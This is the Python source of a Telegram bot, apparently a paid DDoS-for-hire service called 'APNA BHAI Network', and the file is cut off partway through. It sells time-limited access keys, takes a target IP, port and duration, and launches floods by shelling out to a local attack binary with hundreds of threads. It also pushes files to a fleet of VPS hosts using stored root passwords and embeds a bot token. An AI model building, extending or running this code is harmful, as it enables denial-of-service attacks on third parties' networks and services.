import time
import logging
import json
from threading import Thread
import telebot
import asyncio
import random
import string
from datetime import datetime, timedelta
from telebot.apihelper import ApiTelegramException
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from typing import Dict, List, Optional
import sys
import os
import paramiko
from stat import S_ISDIR
import subprocess

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Constants
KEY_PRICES = {
    'hour': 10,  # 10 Rs per hour
    'day': 80,   # 80 Rs per day
    'week': 300  # 300 Rs per week
}
ADMIN_IDS = [6882674372]  # Replace with actual admin IDs
BOT_TOKEN = "7338347553:AAEFxDXVAUuZREXNzx1enS1fqz1hEj2gwkM"  # Replace with your bot token
thread_count = 600
ADMIN_FILE = 'admin_data.json'
VPS_FILE = 'vps_data.json'
OWNER_FILE = 'owner_data.json'
last_attack_times = {}
COOLDOWN_MINUTES = 0
OWNER_IDS = ADMIN_IDS.copy()  # Start with super admins as owners
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# File paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(BASE_DIR, 'users.txt')
KEYS_FILE = os.path.join(BASE_DIR, 'key.txt')

# Global variables
keys = {}
redeemed_keys = set()
loop = None

# Helper functions
def load_users() -> List[Dict]:
    """Load users from file."""
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading users: {e}")
    return []

def save_users(users: List[Dict]) -> bool:
    """Save users to file."""
    try:
        with open(USERS_FILE, 'w') as f:
            json.dump(users, f)
        return True
    except Exception as e:
        logger.error(f"Error saving users: {e}")
        return False

def load_keys() -> Dict:
    """Load keys from file."""
    try:
        if os.path.exists(KEYS_FILE):
            with open(KEYS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading keys: {e}")
    return {}

def save_keys(keys: Dict) -> bool:
    """Save keys to file."""
    try:
        with open(KEYS_FILE, 'w') as f:
            json.dump(keys, f)
        return True
    except Exception as e:
        logger.error(f"Error saving keys: {e}")
        return False

def load_admin_data() -> Dict:
    """Load admin data from file."""
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading admin data: {e}")
    return {'admins': {}}

def save_admin_data(data: Dict) -> bool:
    """Save admin data to file."""
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving admin data: {e}")
        return False

def load_vps_data() -> Dict:
    """Load VPS data from file."""
    try:
        if os.path.exists(VPS_FILE):
            with open(VPS_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading VPS data: {e}")
    return {'vps': {}}

def save_vps_data(data: Dict) -> bool:
    """Save VPS data to file."""
    try:
        with open(VPS_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving VPS data: {e}")
        return False

def load_owner_data() -> Dict:
    """Load owner data from file."""
    try:
        if os.path.exists(OWNER_FILE):
            with open(OWNER_FILE, 'r') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Error loading owner data: {e}")
    return {'owners': OWNER_IDS.copy()}

def save_owner_data(data: Dict) -> bool:
    """Save owner data to file."""
    try:
        with open(OWNER_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except Exception as e:
        logger.error(f"Error saving owner data: {e}")
        return False

def generate_key(length: int = 16) -> str:
    """Generate a random key."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def calculate_key_price(amount: int, time_unit: str) -> int:
    """Calculate the price for a key."""
    if time_unit not in KEY_PRICES:
        return 0
    return amount * KEY_PRICES[time_unit]

def get_admin_balance(user_id: int) -> float:
    """Get admin balance."""
    if is_super_admin(user_id):
        return float('inf')
    
    admin_data = load_admin_data()
    return admin_data['admins'].get(str(user_id), {}).get('balance', 0)

def update_admin_balance(user_id: str, amount: float) -> bool:
    """Update admin balance."""
    if is_super_admin(int(user_id)):
        return True
    
    admin_data = load_admin_data()
    if user_id not in admin_data['admins']:
        return False
    
    current_balance = admin_data['admins'][user_id]['balance']
    if current_balance < amount:
        return False
    
    admin_data['admins'][user_id]['balance'] -= amount
    return save_admin_data(admin_data)

def is_admin(user_id: int) -> bool:
    """Check if user is admin."""
    admin_data = load_admin_data()
    return str(user_id) in admin_data['admins'] or is_super_admin(user_id)

def is_super_admin(user_id: int) -> bool:
    """Check if user is super admin."""
    return user_id in ADMIN_IDS

def is_owner(user_id: int) -> bool:
    """Check if user is owner."""
    owner_data = load_owner_data()
    return user_id in owner_data['owners']

def check_cooldown(user_id: int) -> (bool, int):
    """Check if user is in cooldown."""
    current_time = time.time()
    last_attack_time = last_attack_times.get(user_id, 0)
    cooldown_seconds = COOLDOWN_MINUTES * 60
    
    if current_time - last_attack_time < cooldown_seconds:
        remaining = cooldown_seconds - (current_time - last_attack_time)
        return True, remaining
    return False, 0

def ssh_execute(ip: str, username: str, password: str, command: str) -> (bool, str):
    """Execute SSH command on remote server."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=10)
        
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        
        return True, output
    except Exception as e:
        return False, str(e)

def ssh_upload_file(ip: str, username: str, password: str, local_path: str, remote_path: str) -> (bool, str):
    """Upload file to remote server via SFTP."""
    try:
        transport = paramiko.Transport((ip, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, remote_path)
        sftp.close()
        transport.close()
        
        return True, "File uploaded successfully"
    except Exception as e:
        return False, str(e)

def ssh_remove_file(ip: str, username: str, password: str, remote_path: str) -> (bool, str):
    """Remove file from remote server."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=10)
        
        stdin, stdout, stderr = client.exec_command(f"rm -f {remote_path}")
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        
        if "No such file" in output:
            return False, "File not found"
        return True, "File removed successfully"
    except Exception as e:
        return False, str(e)

def ssh_list_files(ip: str, username: str, password: str, remote_path: str) -> (bool, List[str]):
    """List files in remote directory."""
    try:
        transport = paramiko.Transport((ip, 22))
        transport.connect(username=username, password=password)
        
        sftp = paramiko.SFTPClient.from_transport(transport)
        files = sftp.listdir(remote_path)
        sftp.close()
        transport.close()
        
        return True, files
    except Exception as e:
        return False, [str(e)]

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Keyboard Markups
def get_main_markup(user_id):
    """Show all menu buttons without back button"""
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦"),
        KeyboardButton("🚀 𝐀𝐭𝐭𝐚𝐜𝐤"),
        KeyboardButton("🔑 Redeem Key")
    ]
    
    if is_admin(user_id):
        buttons.append(KeyboardButton("🔑 Generate Key"))
        buttons.append(KeyboardButton("👥 User Management"))
        
    if is_super_admin(user_id):
        buttons.append(KeyboardButton("🛠️ Admin Tools"))
        
    if is_owner(user_id):
        buttons.append(KeyboardButton("🖥️ VPS Management"))
    
    markup.add(*buttons)
    return markup

def get_admin_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("🔑 Generate Key"),
        KeyboardButton("🗑️ Remove User"),
        KeyboardButton("📊 Check Balance"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

def get_super_admin_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add Admin"),
        KeyboardButton("➖ Remove Admin"),
        KeyboardButton("📋 List Users"),
        KeyboardButton("⚙️ Set Threads"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

def get_vps_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add VPS"),
        KeyboardButton("🗑️ Remove VPS"),
        KeyboardButton("📋 List VPS"),
        KeyboardButton("📁 VPS Files"),
        KeyboardButton("👑 Owner Tools"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

def get_vps_files_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("📤 Upload to All"),
        KeyboardButton("🗑️ Remove from All"),
        KeyboardButton("📂 List Files"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

def get_owner_markup():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        KeyboardButton("➕ Add Owner"),
        KeyboardButton("⬅️ Main Menu")
    ]
    markup.add(*buttons)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or "User"
    
    # Send welcome video
    try:
        with open('welcome.mp4', 'rb') as video:
            bot.send_video(
                message.chat.id,
                video,
                caption="🔥 Welcome to APNA BHAI Network! 🔥",
                parse_mode='HTML',
                reply_markup=get_main_markup(user_id)
            )
    except Exception as e:
        logger.error(f"Error sending welcome video: {e}")
        bot.send_message(
            message.chat.id,
            "🔥 Welcome to APNA BHAI Network! 🔥",
            parse_mode='HTML',
            reply_markup=get_main_markup(user_id)
        )
    
    # Send welcome message
    welcome_banner = """
██████╗░░█████╗░██████╗░██╗░░██╗███████╗  ██████╗░░█████╗░██████╗░██╗░░██╗███████╗
██╔══██╗██╔══██╗██╔══██╗██║░░██║██╔════╝  ██╔══██╗██╔══██╗██╔══██╗██║░░██║██╔════╝
██████╔╝███████║██║░░██║███████║█████╗░░  ██████╔╝██║░░██║██║░░██║███████║█████╗░░
██╔══██╗██╔══██║██║░░██║██╔══██║██╔══╝░░  ██╔══██╗██║░░██║██║░░██║██╔══██║██╔══╝░░
██║░░██║██║░░██║██████╔╝██║░░██║███████╗  ██║░░██║╚█████╔╝██████╔╝██║░░██║███████╗
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝
    """
    
    styled_text = """
🔮 <b>𝓦𝓮𝓵𝓬𝓸𝓶𝓮 𝓽𝓸 𝓐𝓟𝓝𝓐 𝓑𝓗𝓐𝓘 𝓝𝓮𝓽𝓦𝓸𝓻𝓴</b> 🔮

✨ <i>ᴛʜᴇ ᴍᴏꜱᴛ ᴘᴏᴡᴇʀꜰᴜʟ ᴅᴅᴏꜱ ᴘʟᴀᴛꜰᴏʀᴍ ᴏɴ ᴛᴇʟᴇɢʀᴀᴍ</i> ✨

╔══════════════════════╗
  ☄️ <b>ꜰᴇᴀᴛᴜʀᴇꜱ</b> ☄️
╚══════════════════════╝

• 🚀 <b>ᴜʟᴛʀᴀ-ꜰᴀꜱᴛ ᴀᴛᴛᴀᴄᴋꜱ</b>
• 🔐 <b>ᴠɪᴘ ᴋᴇʏ ꜱʏꜱᴛᴇᴍ</b>
• 👑 <b>ᴍᴜʟᴛɪ-ᴠᴘꜱ ꜱᴜᴘᴘᴏʀᴛ</b>
• ⚡ <b>ᴘʀᴇᴍɪᴜᴍ ꜱᴘᴏᴏꜰᴇʀ</b>

╔══════════════════════╗
  💎 <b>ᴘʀᴇᴍɪᴜᴍ ᴇxᴘᴇʀɪᴇɴᴄᴇ</b> 💎
╚══════════════════════╝

▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>꧁༺ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗔𝗣𝗡𝗔 𝗕𝗛𝗔𝗜 𝗡𝗘𝗧𝗪𝗢𝗥𝗞 ༻꧂</b>
<b>᚛ ᚛ 𝗢𝘄𝗻𝗲𝗿 𝗜𝗗: @LASTWISHES0, @LostBoiXD ᚜ ᚜</b>
    """

    bot.send_message(
        message.chat.id,
        f"<pre>{welcome_banner}</pre>\n{styled_text}",
        parse_mode='HTML',
        reply_markup=get_main_markup(user_id)
    )
    
    bot.send_message(
        message.chat.id,
        "🛠️ <b>How to get started:</b>\n\n"
        "1️⃣ Use the buttons below to navigate\n"
        "2️⃣ Follow the instructions\n\n"
        "📩 <b>Contact owner for any help:</b> @LASTWISHES0, @LostBoiXD",
        parse_mode='HTML',
        reply_markup=get_main_markup(user_id)
    )

@bot.message_handler(func=lambda message: message.text == "⬅️ Main Menu")
def return_to_main_menu(message):
    user_id = message.from_user.id
    bot.send_message(
        message.chat.id,
        "🔰 *Main Menu* 🔰",
        parse_mode='Markdown',
        reply_markup=get_main_markup(user_id)
    )

@bot.message_handler(func=lambda message: message.text == "𝐌𝐲 𝐀𝐜𝐜𝐨𝐮𝐧𝐭🏦")
def my_account(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if is_admin(user_id):
        bot.send_message(chat_id, "*You are an admin!*", parse_mode='Markdown')
        return
    
    users = load_users()
    user = next((u for u in users if u['user_id'] == user_id), None)
    
    if not user:
        bot.send_message(chat_id, "*You don't have an active account. Please redeem a key.*", parse_mode='Markdown')
        return
    
    valid_until = datetime.fromisoformat(user['valid_until'])
    remaining = valid_until - datetime.now()
    
    if remaining.total_seconds() <= 0:
        bot.send_message(chat_id, "*Your key has expired. Please redeem a new key.*", parse_mode='Markdown')
    else:
        hours, remainder = divmod(remaining.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        bot.send_message(
            chat_id,
            f"*Account Information*\n\n"
            f"User ID: `{user_id}`\n"
            f"Expires in: `{int(hours)}h {int(minutes)}m`\n"
            f"Valid until: `{valid_until.strftime('%Y-%m-%d %H:%M:%S')}`",
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "🚀 𝐀𝐭𝐭𝐚𝐜𝐤")
def attack_command(message):
    chat_id = message.chat.id
    bot.send_message(
        chat_id,
        "*Attack Command Format:*\n\n"
        "`<IP> <PORT> <TIME>`\n\n"
        "Example:\n"
        "`1.1.1.1 80 60`\n\n"
        "Note: Some ports are blocked for security reasons.",
        parse_mode='Markdown'
    )

def process_attack_command(message, chat_id):
    """Process attack command from user."""
    user_id = message.from_user.id
    command = message.text.strip()
    
    # Check if user is authorized
    if not is_admin(user_id):
        users = load_users()
        found_user = next((user for user in users if user['user_id'] == user_id), None)
        if not found_user:
            bot.send_message(chat_id, "*You are not registered. Please redeem a key.*", parse_mode='Markdown')
            return
        if datetime.now() > datetime.fromisoformat(found_user['valid_until']):
            bot.send_message(chat_id, "*Your key has expired. Please redeem a new key.*", parse_mode='Markdown')
            return
    
    # Parse command
    try:
        parts = command.split()
        if len(parts) < 3:
            bot.send_message(chat_id, "*Invalid format. Use: <IP> <PORT> <TIME>*", parse_mode='Markdown')
            return
            
        ip = parts[0]
        port = int(parts[1])
        attack_time = int(parts[2])
        
        # Validate port
        if port in blocked_ports:
            bot.send_message(chat_id, "*This port is blocked for attacks.*", parse_mode='Markdown')
            return
            
        # Validate time
        max_time = 120 if is_admin(user_id) else 60
        if attack_time > max_time:
            bot.send_message(chat_id, f"*Maximum attack time is {max_time} seconds.*", parse_mode='Markdown')
            return
            
        # Update cooldown
        last_attack_times[user_id] = time.time()
        
        # Send attack started message
        start_msg = bot.send_message( 
            chat_id,
            f"╔════════════════════════════╗\n"
            f"║    🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!    ║\n"
            f"╚════════════════════════════╝\n\n"
            f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁 ➜ `{ip}:{port}`\n"
            f"⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ➜ `{attack_time} seconds`\n"
            f"🌀 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 ➜ `{thread_count}`\n\n"
            f"⚡ 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ 𝘼𝙏𝙏𝘼𝘾𝙆𝙄𝙉𝙂 𝙉𝙊𝙒...\n\n"
            f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
            f"꧁༺ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 𝗣𝗔𝗥𝗔𝗗𝗢𝗫 ༻꧂\n"
            f"᚛ ᚛ 𝗗𝗲𝘃: @LostBoiXD @LASTWISHES0 ᚜ ᚜",
            parse_mode='Markdown')
        
        # Execute attack using subprocess and wait for completion
        full_command = f"./sahil {ip} {port} {attack_time} {thread_count}"
        try:
            process = subprocess.Popen(full_command, shell=True)
            
            # Wait for the attack duration plus a small buffer
            time.sleep(attack_time + 2)
            
            # Check if process is still running
            if process.poll() is None:
                process.terminate()
            
            # Edit the original message to show completion
            bot.edit_message_text(
                f"╔════════════════════════════╗\n"
                f"║    ✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!    ║\n"
                f"╚════════════════════════════╝\n\n"
                f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁 ➜ `{ip}:{port}`\n"
                f"⏱️ 𝗧𝗶𝗺𝗲 𝗦𝗽𝗲𝗻𝘁 ➜ `{attack_time} seconds`\n\n"
                f"🔥 𝗦𝘁𝗮𝘁𝘂𝘀 ➜ 𝙏𝘼𝙍𝙂𝙀𝙏 𝘿𝙀𝙎𝙏𝙍𝙊𝙔𝙀𝘿!\n\n"
                f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
                f"꧁༺ 𝗧𝗛𝗔𝗡𝗞𝗦 𝗙𝗢𝗥 𝗨𝗦𝗜𝗡𝗚 𝗣𝗔𝗥𝗔𝗗𝗢𝗫 ༻꧂",
                chat_id=chat_id,
                message_id=start_msg.message_id,
                parse_mode='Markdown')
                
        except Exception as e:
            logger.error(f"Error executing attack: {e}")
            bot.edit_message_text(
                "*Error during attack execution!*",
                chat_id=chat_id,
                message_id=start_msg.message_id,
                parse_mode='Markdown')
            
    except ValueError:
        bot.send_message(chat_id, "*Invalid input. Use numbers for port and time.*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in attack command: {e}")
        bot.send_message(chat_id, "*An error occurred while processing your attack.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🔑 Generate Key" and is_admin(message.from_user.id))
def generate_key_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to generate keys.*", parse_mode='Markdown')
        return
    
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    row1 = [KeyboardButton("⏳ 1 Hour"), KeyboardButton("📅 1 Day")]
    row2 = [KeyboardButton("📆 1 Week"), KeyboardButton("⬅️ Main Menu")]
    markup.row(*row1)
    markup.row(*row2)
    
    bot.send_message(
        chat_id,
        "*Select key type:*",
        reply_markup=markup,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text in ["⏳ 1 Hour", "📅 1 Day", "📆 1 Week"] and is_admin(message.from_user.id))
def process_key_generation(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    username = message.from_user.username or "Admin"
    
    time_unit_map = {
        "⏳ 1 Hour": "hour",
        "📅 1 Day": "day",
        "📆 1 Week": "week"
    }
    
    time_unit = time_unit_map.get(message.text)
    if not time_unit:
        bot.send_message(chat_id, "*Invalid selection.*", parse_mode='Markdown')
        return
    
    key = "APNA-BHAI-" + ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=6))
    
    keys[key] = {
        'duration': time_unit,
        'generated_by': user_id,
        'generated_by_username': username,
        'generated_at': datetime.now().isoformat(),
        'redeemed': False
    }
    
    save_keys(keys)
    
    bot.send_message(
        chat_id,
        f"*🔑 Key Generated Successfully!*\n\n"
        f"Key: `{key}`\n"
        f"Type: `{message.text[2:]}`\n"
        f"Generated by: @{username if username != 'Admin' else 'Admin'}",
        reply_markup=get_main_markup(user_id),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🔑 Redeem Key")
def redeem_key_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    bot.send_message(
        chat_id,
        "*Please enter your key to redeem:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, redeem_key)

@bot.message_handler(func=lambda message: message.text == "👥 User Management" and is_admin(message.from_user.id))
def user_management(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission for user management.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*User Management*",
        reply_markup=get_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🗑️ Remove User" and is_admin(message.from_user.id))
def remove_user_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove users.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to remove:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_user_removal)

def process_user_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    target_user = message.text.strip()
    
    try:
        target_user_id = int(target_user)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    users = load_users()
    updated_users = [u for u in users if u['user_id'] != target_user_id]
    
    if len(updated_users) < len(users):
        save_users(updated_users)
        bot.send_message(
            chat_id,
            f"*User {target_user_id} removed successfully!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*User {target_user_id} not found!*",
            reply_markup=get_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📊 Check Balance" and is_admin(message.from_user.id))
def check_balance(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if is_super_admin(user_id):
        bot.send_message(chat_id, "*You have unlimited balance!*", parse_mode='Markdown')
        return
    
    admin_data = load_admin_data()
    balance = admin_data['admins'].get(str(user_id), {}).get('balance', 0)
    
    bot.send_message(
        chat_id,
        f"*Your current balance: {balance} Rs*",
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🛠️ Admin Tools" and is_super_admin(message.from_user.id))
def admin_tools(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission for admin tools.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Admin Tools*",
        reply_markup=get_super_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add Admin" and is_super_admin(message.from_user.id))
def add_admin_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to add admins.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the User ID to add as admin:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_admin_addition)

def process_admin_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_admin = message.text.strip()
    
    try:
        new_admin_id = int(new_admin)
    except ValueError:
        bot.send_message(chat_id, "*Invalid User ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    admin_data = load_admin_data()
    
    if str(new_admin_id) in admin_data['admins']:
        bot.send_message(
            chat_id,
            f"*User {new_admin_id} is already an admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    admin_data['admins'][str(new_admin_id)] = {
        'added_by': user_id,
        'added_at': datetime.now().isoformat(),
        'balance': 0
    }
    
    if save_admin_data(admin_data):
        bot.send_message(
            chat_id,
            f"*User {new_admin_id} added as admin successfully!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to add admin {new_admin_id}.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "➖ Remove Admin" and is_super_admin(message.from_user.id))
def remove_admin_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to remove admins.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send the Admin ID to remove:*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_admin_removal)

def process_admin_removal(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    admin_to_remove = message.text.strip()
    
    try:
        admin_id = int(admin_to_remove)
    except ValueError:
        bot.send_message(chat_id, "*Invalid Admin ID. Please enter a number.*", parse_mode='Markdown')
        return
    
    if admin_id in ADMIN_IDS:
        bot.send_message(
            chat_id,
            "*Cannot remove super admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    admin_data = load_admin_data()
    
    if str(admin_id) not in admin_data['admins']:
        bot.send_message(
            chat_id,
            f"*User {admin_id} is not an admin!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    del admin_data['admins'][str(admin_id)]
    
    if save_admin_data(admin_data):
        bot.send_message(
            chat_id,
            f"*Admin {admin_id} removed successfully!*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
    else:
        bot.send_message(
            chat_id,
            f"*Failed to remove admin {admin_id}.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )

@bot.message_handler(func=lambda message: message.text == "📋 List Users" and is_super_admin(message.from_user.id))
def list_users_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to list users.*", parse_mode='Markdown')
        return
    
    users = load_users()
    admin_data = load_admin_data()
    
    if not users:
        bot.send_message(chat_id, "*No users found!*", parse_mode='Markdown')
        return
    
    response = "*Registered Users:*\n\n"
    for user in users:
        valid_until = datetime.fromisoformat(user['valid_until'])
        remaining = valid_until - datetime.now()
        hours = int(remaining.total_seconds() // 3600)
        minutes = int((remaining.total_seconds() % 3600) // 60)
        
        response += (
            f"User ID: `{user['user_id']}`\n"
            f"Key: `{user['key']}`\n"
            f"Expires in: `{hours}h {minutes}m`\n"
            f"Valid until: `{valid_until.strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
        )
    
    bot.send_message(
        chat_id,
        response,
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "⚙️ Set Threads" and is_super_admin(message.from_user.id))
def set_threads_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_super_admin(user_id):
        bot.send_message(chat_id, "*You don't have permission to set threads.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Enter new thread count (100-1000):*",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_thread_setting)

def process_thread_setting(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    new_threads = message.text.strip()
    
    try:
        threads = int(new_threads)
        if threads < 100 or threads > 1000:
            raise ValueError
    except ValueError:
        bot.send_message(
            chat_id,
            "*Invalid thread count. Please enter a number between 100 and 1000.*",
            reply_markup=get_super_admin_markup(),
            parse_mode='Markdown'
        )
        return
    
    global thread_count
    thread_count = threads
    
    bot.send_message(
        chat_id,
        f"*Thread count updated to {thread_count} successfully!*",
        reply_markup=get_super_admin_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "🖥️ VPS Management" and is_owner(message.from_user.id))
def vps_management(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission for VPS management.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*VPS Management*",
        reply_markup=get_vps_markup(),
        parse_mode='Markdown'
    )

@bot.message_handler(func=lambda message: message.text == "➕ Add VPS" and is_owner(message.from_user.id))
def add_vps_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.send_message(chat_id, "*You don't have permission to add VPS.*", parse_mode='Markdown')
        return
    
    bot.send_message(
        chat_id,
        "*Send VPS details in format:*\n\n"
        "`IP USERNAME PASSWORD`\n\n"
        "Example:\n"
        "`1.1.1.1 root password123`",
        reply_markup=ReplyKeyboardRemove(),
        parse_mode='Markdown'
    )
    bot.register_next_step_handler(message, process_vps_addition)

def process_vps_addition(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    vps_details = message.text.strip().split()
    
    if len(vps_details) != 3:
        bot.send_message(
            chat_id,
            "*Invalid format. Please use: IP USERNAME PASSWORD*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    ip, username, password = vps_details
    vps_data = load_vps_data()
    
    if ip in vps_data['vps']:
        bot.send_message(
            chat_id,
            f"*VPS {ip} already exists!*",
            reply_markup=get_vps_markup(),
            parse_mode='Markdown'
        )
        return
    
    vps_data['vps'][ip] = {
        'username': username,
        'password': password,
        'added_by': user_id,
